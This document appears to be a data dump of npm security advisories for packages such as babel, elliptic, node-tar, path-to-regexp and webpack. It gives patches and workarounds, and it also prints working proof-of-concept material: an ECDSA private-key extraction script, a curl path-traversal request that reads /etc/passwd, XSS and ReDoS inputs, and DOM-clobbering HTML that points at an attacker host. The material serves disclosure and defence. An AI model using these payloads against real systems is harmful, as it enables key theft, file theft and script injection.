Known affected plugins are: - `@babel/plugin-transform-runtime` - `@babel/preset-env` when using its [`useBuiltIns`](https://babeljs.io/docs/babel-preset-env#usebuiltins) option - Any ""polyfill provider"" plugin that depends on `@babel/helper-define-polyfill-provider`, such as `babel-plugin-polyfill-corejs3`, `babel-plugin-polyfill-corejs2`, `babel-plugin-polyfill-es-shims`, `babel-plugin-polyfill-regenerator`  No other plugins under the `@babel/` namespace are impacted, but third-party plugins might be.  **Users that only compile trusted code are not impacted.**  ### Patches  The vulnerability has been fixed in `@babel/traverse@7.23.2`.  Babel 6 does not receive security fixes anymore (see [Babel's security policy](https://github.com/babel/babel/security/policy)), hence there is no patch planned for `babel-traverse@6`.  ### Workarounds  - Upgrade `@babel/traverse` to v7.23.2 or higher.

However, the second line of the `checkValue` function wrongly checks the upper bound of the passed parameters, since the value of `b.cmp(q)` can only be `0`, `1` and `-1`, and it can never be greater than `q`.   In this way, although the values of `s` cannot be `0`, an attacker can achieve the same effect as zero by setting its value to `q`, and then send `(r, s) = (1, q)` to pass the verification of any public key.  ### Impact All places in this project that involve DSA verification of user-input signatures will be affected by this vulnerability.   ### Fix PR: Since the temporary private fork was deleted, here's a webarchive of the PR discussion and diff pages: [PR webarchive.zip](https://github.com/browserify/browserify-sign/files/13172957/PR.webarchive.zip)",NPM,"","","",HIGH,7.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N,"","","",HIGHEST,3,"","","","","","","",""

For example, `serialize(""userName=<script>alert('XSS3')</script>; Max-Age=2592000; a"", value)` would result in `""userName=<script>alert('XSS3')</script>; Max-Age=2592000; a=test""`, setting `userName` cookie to `<script>` and ignoring `value`.

Meaning that a same `nonce` could be generated for different messages used in signing process, leading to `k` reuse, leading to private key extraction from a pair of signatures  Such a message can be constructed for any already known message/signature pair, meaning that the attack needs only a single malicious message being signed for a full key extraction  While signing unverified attacker-controlled messages would be problematic itself (and exploitation of this needs such a scenario), signing a single message still _should not_ leak the private key  Also, message validation could have the same bug (out of scope for this report, but could be possible in some situations), which makes this attack more likely when used in a chain  ### PoC  #### `k` reuse example  ```js import elliptic from 'elliptic'  const { ec: EC } = elliptic  const privateKey = crypto.getRandomValues(new Uint8Array(32)) const curve = 'ed25519' // or any other curve, e.g. secp256k1 const ec = new EC(curve) const prettyprint = ({ r, s }) => `r: ${r}, s: ${s}` const sig0 = prettyprint(ec.sign(Buffer.alloc(32, 1), privateKey)) // array of ones const sig1 = prettyprint(ec.sign('01'.repeat(32), privateKey)) // same message in hex form const sig2 = prettyprint(ec.sign('-' + '01'.repeat(32), privateKey)) // same `r`, different `s` console.log({ sig0, sig1, sig2 }) ```  #### Full attack  This doesn't include code for generation/recovery on a purpose (bit it's rather trivial)  ```js import elliptic from 'elliptic'  const { ec: EC } = elliptic  const privateKey = crypto.getRandomValues(new Uint8Array(32)) const curve = 'secp256k1' // or any other curve, e.g. ed25519 const ec = new EC(curve)  // Any message, e.g. previously known signature const msg0 = crypto.getRandomValues(new Uint8Array(32)) const sig0 = ec.sign(msg0, privateKey)  // Attack const msg1 = funny(msg0) // this is a string here, but can also be of other non-Uint8Array types const sig1 = ec.sign(msg1, privateKey)  const something = extract(msg0, sig0, sig1, curve)  console.log('Curve:', curve) console.log('Typeof:', typeof msg1) console.log('Keys equal?', Buffer.from(privateKey).toString('hex') === something) const rnd = crypto.getRandomValues(new Uint8Array(32)) const st = (x) => JSON.stringify(x) console.log('Keys equivalent?', st(ec.sign(rnd, something).toDER()) === st(ec.sign(rnd, privateKey).toDER())) console.log('Orig key:', Buffer.from(privateKey).toString('hex')) console.log('Restored:', something) ```  Output: ```console Curve: secp256k1 Typeof: string Keys equal? true Keys equivalent? true Orig key: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a Restored: c7870f7eb3e8fd5155d5c8cdfca61aa993eed1fbe5b41feef69a68303248c22a ```  Similar for `ed25519`, but due to low `n`, the key might not match precisely but is nevertheless equivalent for signing: ```console Curve: ed25519 Typeof: string Keys equal? false Keys equivalent? true Orig key: f1ce0e4395592f4de24f6423099e022925ad5d2d7039b614aaffdbb194a0d189 Restored: 01ce0e4395592f4de24f6423099e0227ec9cb921e3b7858581ec0d26223966a6 ``` `restored` is equal to `orig` mod `N`.  ### Impact  Full private key extraction when signing a single malicious message (that passes `JSON.stringify`/`JSON.parse`)",NPM,"","","","","","","","","",HIGHEST,3,"","","","","","","",""

For example, `/:a-:b`.  ### Patches  For users of 0.1, upgrade to `0.1.10`. All other users should upgrade to `8.0.0`.  These versions add backtrack protection when a custom regex pattern is not provided:  - [0.1.10](https://github.com/pillarjs/path-to-regexp/releases/tag/v0.1.10) - [1.9.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v1.9.0) - [3.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v3.3.0) - [6.3.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v6.3.0)  They do not protect against vulnerable user supplied capture groups. Protecting against explicit user patterns is out of scope for old versions and not considered a vulnerability.  Version [7.1.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v7.1.0) can enable `strict: true` and get an error when the regular expression might be bad.  Version [8.0.0](https://github.com/pillarjs/path-to-regexp/releases/tag/v8.0.0) removes the features that can cause a ReDoS.  ### Workarounds  All versions can be patched by providing a custom regular expression for parameters after the first in a single segment. As long as the custom regular expression does not match the text before the parameter, you will be safe. For example, change `/:a-:b` to `/:a-:b([^-/]+)`.  If paths cannot be rewritten and versions cannot be upgraded, another alternative is to limit the URL length. For example, halving the attack string improves performance by 4x faster.  ### Details  Using `/:a-:b` will produce the regular expression `/^\/([^\/]+?)-([^\/]+?)\/?$/`. This can be exploited by a path such as `/a${'-a'.repeat(8_000)}/a`. [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) has a good example of why this occurs, but the TL;DR is the `/a` at the end ensures this route would never match but due to naive backtracking it will still attempt every combination of the `:a-:b` on the repeated 8,000 `-a`.  Because JavaScript is single threaded and regex matching runs on the main thread, poor performance will block the event loop and can lead to a DoS. In local benchmarks, exploiting the unsafe regex will result in performance that is over 1000x worse than the safe regex. In a more realistic environment using Express v4 and 10 concurrent connections, this translated to average latency of ~600ms vs 1ms.  ### References  * [OWASP](https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS) * [Detailed blog post](https://blakeembrey.com/posts/2024-09-web-redos/)",NPM,"","","",HIGH,7.5,CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,"","","",HIGHEST,3,"","","","","","","",""

With 5.x after 5.6.28 or 7.x after 7.0.13, the issue is resolved in a non-default configuration with the opcache.validate_permission=1 setting. The vulnerability details are as follows. In PHP SAPIs where PHP interpreters share a common parent process, Zend OpCache creates a shared memory object owned by the common parent during initialization. Child PHP processes inherit the SHM descriptor, using it to cache and retrieve compiled script bytecode (""opcode"" in PHP jargon). Cache keys vary depending on configuration, but filename is a central key component, and compiled opcode can generally be run if a script's filename is known or can be guessed. Many common shared-hosting configurations change EUID in child processes to enforce privilege separation among hosted users (for example using mod_ruid2 for the Apache HTTP Server, or php-fpm user settings). In these scenarios, the default Zend OpCache behavior defeats script file permissions by sharing a single SHM cache among all child PHP processes.

This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created. This logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory, where the symlink and directory names in the archive entry used backslashes as a path separator on posix systems. The cache checking logic used both `\` and `/` characters as path separators, however `\` is a valid filename character on posix systems. By first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite. Additionally, a similar confusion could arise on case-insensitive filesystems. If a tar archive contained a directory at `FOO`, followed by a symbolic link named `foo`, then on case-insensitive file systems, the creation of the symbolic link would remove the directory from the filesystem, but _not_ from the internal directory cache, as it would not be treated as a cache hit. A subsequent file entry within the `FOO` directory would then be placed in the target of the symbolic link, thinking that the directory had already been created.

This is achieved by stripping the absolute path root from any absolute file paths contained in a tar file. For example `/home/user/.bashrc` would turn into `home/user/.bashrc`.   This logic was insufficient when file paths contained repeated path roots such as `////home/user/.bashrc`. `node-tar` would only strip a single path root from such paths.

This is, in part, accomplished by sanitizing absolute paths of entries within the archive, skipping archive entries that contain `..` path portions, and resolving the sanitized paths against the extraction target directory.  This logic was insufficient on Windows systems when extracting tar files that contained a path that was not an absolute path, but specified a drive letter different from the extraction target, such as `C:some\path`.  If the drive letter does not match the extraction target, for example `D:\extraction\dir`, then the result of `path.resolve(extractionDirectory, entryPath)` would resolve against the current working directory on the `C:` drive, rather than the extraction target directory.  Additionally, a `..` portion of the path could occur immediately after the drive letter, such as `C:../foo`, and was not properly sanitized by the logic that checked for `..` within the normalized and split portions of the path.  This only affects users of `node-tar` on Windows systems.  ### Patches  4.4.18 || 5.0.10 || 6.1.9  ### Workarounds  There is no reasonable way to work around this issue without performing the same path normalization procedures that node-tar now does.  Users are encouraged to upgrade to the latest patched versions of node-tar, rather than attempt to sanitize paths themselves.  ### Fix  The fixed versions strip path roots from all paths prior to being resolved against the extraction target folder, even if such paths are not ""absolute"".  Additionally, a path starting with a drive letter and then two dots, like `c:../`, would bypass the check for `..` path portions.  This is checked properly in the patched versions.  Finally, a defense in depth check is added, such that if the `entry.absolute` is outside of the extraction taret, and we are not in preservePaths:true mode, a warning is raised on that entry, and it is skipped.  Currently, it is believed that this check is redundant, but it did catch some oversights in development.",NPM,"","","",HIGH,8.199999809265137,CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:N,"","","",HIGHEST,3,"","","","","","","",""

This is, in part, achieved by ensuring that extracted directories are not symlinks. Additionally, in order to prevent unnecessary stat calls to determine whether a given path is a directory, paths are cached when directories are created.  This logic was insufficient when extracting tar files that contained both a directory and a symlink with the same name as the directory, where the symlink and directory names in the archive entry used backslashes as a path separator on posix systems. The cache checking logic used both `\` and `/` characters as path separators, however `\` is a valid filename character on posix systems.  By first creating a directory, and then replacing that directory with a symlink, it was thus possible to bypass node-tar symlink checks on directories, essentially allowing an untrusted tar file to symlink into an arbitrary location and subsequently extracting arbitrary files into that location, thus allowing arbitrary file creation and overwrite.  Additionally, a similar confusion could arise on case-insensitive filesystems.  If a tar archive contained a directory at `FOO`, followed by a symbolic link named `foo`, then on case-insensitive file systems, the creation of the symbolic link would remove the directory from the filesystem, but _not_ from the internal directory cache, as it would not be treated as a cache hit.  A subsequent file entry within the `FOO` directory would then be placed in the target of the symbolic link, thinking that the directory had already been created.

All paths are normalized to use `/` as a path separator, replacing `\` with `/` on Windows systems, and leaving `\` intact in the path on posix systems.  This is performed in depth, at every level of the program where paths are consumed. 2. Directory cache pruning is performed case-insensitively.  This _may_ result in undue cache misses on case-sensitive file systems, but the performance impact is negligible.  #### Caveat  Note that this means that the `entry` objects exposed in various parts of tar's API will now always use `/` as a path separator, even on Windows systems.  This is not expected to cause problems, as `/` is a valid path separator on Windows systems, but _may_ result in issues if `entry.path` is compared against a path string coming from some other API such as `fs.realpath()` or `path.resolve()`.

The public path prefix is stripped from the URL, and the **unsecaped** path suffix is appended to the _outputPath_: [https://github.com/webpack/webpack-dev-middleware/blob/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377/src/utils/getFilenameFromUrl.js#L82](https://github.com/webpack/webpack-dev-middleware/blob/7ed24e0b9f53ad1562343f9f517f0f0ad2a70377/src/utils/getFilenameFromUrl.js#L82) As the URL is not unescaped and normalized automatically before calling the midlleware, it is possible to use _%2e_ and _%2f_ sequences to perform path traversal attack.  ### PoC _A blank project can be created containing the following configuration file **webpack.config.js**:_ `module.exports = {   devServer: {     devMiddleware: {       writeToDisk: true     }   } }; `  When started, it is possible to access any local file, e.g. _/etc/passwd_: `$ curl localhost:8080/public/..%2f..%2f..%2f..%2f../etc/passwd` ``` root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin ```  ### Impact The developers using _webpack-dev-server_ or _webpack-dev-middleware_ are affected by the issue. When the project is started, an attacker might access any file on the developer's machine and exfiltrate the content (e.g. password, configuration files, private source code, ...).  If the development server is listening on a public IP address (or **0.0.0.0**), an attacker on the local network can access the local files without any interaction from the victim (direct connection to the port).  If the server allows access from third-party domains (CORS, **_Allow-Access-Origin: *_** ), an attacker can send a malicious link to the victim. When visited, the client side script can connect to the local server and exfiltrate the local files.  ### Recommendation The URL should be unescaped and normalized before any further processing.",NPM,"","","",HIGH,7.400000095367432,CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:N/A:N,"","","",HIGHEST,3,"","","","","","","",""

The DOM Clobbering gadget in the module can lead to cross-site scripting (XSS) in web pages where scriptless attacker-controlled HTML elements (e.g., an `img` tag with an unsanitized `name` attribute) are present.  We found the real-world exploitation of this gadget in the Canvas LMS which allows XSS attack happens through an javascript code compiled by Webpack (the vulnerable part is from Webpack). We believe this is a severe issue. If Webpack’s code is not resilient to DOM Clobbering attacks, it could lead to significant security vulnerabilities in any web application using Webpack-compiled code.   ### Details  #### Backgrounds  DOM Clobbering is a type of code-reuse attack where the attacker first embeds a piece of non-script, seemingly benign HTML markups in the webpage (e.g. through a post or comment) and leverages the gadgets (pieces of js code) living in the existing javascript code to transform it into executable code. More for information about DOM Clobbering, here are some references:  [1] https://scnps.co/papers/sp23_domclob.pdf [2] https://research.securitum.com/xss-in-amp4email-dom-clobbering/   #### Gadgets found in Webpack  We identified a DOM Clobbering vulnerability in Webpack’s `AutoPublicPathRuntimeModule`. When the `output.publicPath` field in the configuration is not set or is set to `auto`, the following code is generated in the bundle to dynamically resolve and load additional JavaScript files:  ``` /******/ 	/* webpack/runtime/publicPath */ /******/ 	(() => { /******/ 		var scriptUrl; /******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + """"; /******/ 		var document = __webpack_require__.g.document; /******/ 		if (!scriptUrl && document) { /******/ 			if (document.currentScript) /******/ 				scriptUrl = document.currentScript.src; /******/ 			if (!scriptUrl) { /******/ 				var scripts = document.getElementsByTagName(""script""); /******/ 				if(scripts.length) { /******/ 					var i = scripts.length - 1; /******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src; /******/ 				} /******/ 			} /******/ 		} /******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration /******/ 		// or pass an empty string ("""") and set the __webpack_public_path__ variable from your code to use your own logic. /******/ 		if (!scriptUrl) throw new Error(""Automatic publicPath is not supported in this browser""); /******/ 		scriptUrl = scriptUrl.replace(/#.*$/, """").replace(/\?.*$/, """").replace(/\/[^\/]+$/, ""/""); /******/ 		__webpack_require__.p = scriptUrl; /******/ 	})(); ```  However, this code is vulnerable to a DOM Clobbering attack. The lookup on the line with `document.currentScript` can be shadowed by an attacker, causing it to return an attacker-controlled HTML element instead of the current script element as intended. In such a scenario, the `src` attribute of the attacker-controlled element will be used as the `scriptUrl` and assigned to `__webpack_require__.p`. If additional scripts are loaded from the server, `__webpack_require__.p` will be used as the base URL, pointing to the attacker's domain. This could lead to arbitrary script loading from the attacker's server, resulting in severe security risks.  ### PoC  Please note that we have identified a real-world exploitation of this vulnerability in the Canvas LMS. Once the issue has been patched, I am willing to share more details on the exploitation. For now, I’m providing a demo to illustrate the concept.  Consider a website developer with the following two scripts, `entry.js` and `import1.js`, that are compiled using Webpack:  ``` // entry.js import('./import1.js')   .then(module => {     module.hello();   })   .catch(err => {     console.error('Failed to load module', err);   }); ```  ``` // import1.js export function hello () {   console.log('Hello'); } ```  The webpack.config.js is set up as follows: ``` const path = require('path');  module.exports = {   entry: './entry.js', // Ensure the correct path to your entry file   output: {     filename: 'webpack-gadgets.bundle.js', // Output bundle file     path: path.resolve(__dirname, 'dist'), // Output directory     publicPath: ""auto"", // Or leave this field not set   },   target: 'web',   mode: 'development', }; ```  When the developer builds these scripts into a bundle and adds it to a webpage, the page could load the `import1.js` file from the attacker's domain, `attacker.controlled.server`. The attacker only needs to insert an `img` tag with the `name` attribute set to `currentScript`. This can be done through a website's feature that allows users to embed certain script-less HTML (e.g., markdown renderers, web email clients, forums) or via an HTML injection vulnerability in third-party JavaScript loaded on the page.  ``` <!DOCTYPE html> <html> <head>   <title>Webpack Example</title>   <!-- Attacker-controlled Script-less HTML Element starts--!>   <img name=""currentScript"" src=""https://attacker.controlled.server/""></img>   <!-- Attacker-controlled Script-less HTML Element ends--!> </head> <script src=""./dist/webpack-gadgets.bundle.js""></script> <body> </body> </html> ```  ### Impact  This vulnerability can lead to cross-site scripting (XSS) on websites that include Webpack-generated files and allow users to inject certain scriptless HTML tags with improperly sanitized name or id attributes.  ### Patch  A possible patch to this vulnerability could refer to the Google Closure project which makes itself resistant to DOM Clobbering attack: https://github.com/google/closure-library/blob/b312823ec5f84239ff1db7526f4a75cba0420a33/closure/goog/base.js#L174  ``` /******/ 	/* webpack/runtime/publicPath */ /******/ 	(() => { /******/ 		var scriptUrl; /******/ 		if (__webpack_require__.g.importScripts) scriptUrl = __webpack_require__.g.location + """"; /******/ 		var document = __webpack_require__.g.document; /******/ 		if (!scriptUrl && document) { /******/ 			if (document.currentScript && document.currentScript.tagName.toUpperCase() === 'SCRIPT') // Assume attacker cannot control script tag, otherwise it is XSS already :> /******/ 				scriptUrl = document.currentScript.src; /******/ 			if (!scriptUrl) { /******/ 				var scripts = document.getElementsByTagName(""script""); /******/ 				if(scripts.length) { /******/ 					var i = scripts.length - 1; /******/ 					while (i > -1 && (!scriptUrl || !/^http(s?):/.test(scriptUrl))) scriptUrl = scripts[i--].src; /******/ 				} /******/ 			} /******/ 		} /******/ 		// When supporting browsers where an automatic publicPath is not supported you must specify an output.publicPath manually via configuration /******/ 		// or pass an empty string ("""") and set the __webpack_public_path__ variable from your code to use your own logic. /******/ 		if (!scriptUrl) throw new Error(""Automatic publicPath is not supported in this browser""); /******/ 		scriptUrl = scriptUrl.replace(/#.*$/, """").replace(/\?.*$/, """").replace(/\/[^\/]+$/, ""/""); /******/ 		__webpack_require__.p = scriptUrl; /******/ 	})(); ```  Please note that if we do not receive a response from the development team within three months, we will disclose this vulnerability to the CVE agent.",NPM,"","","",MEDIUM,6.400000095367432,CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:L/I:L/A:H,"","","",HIGHEST,3,"","","","","","","",""
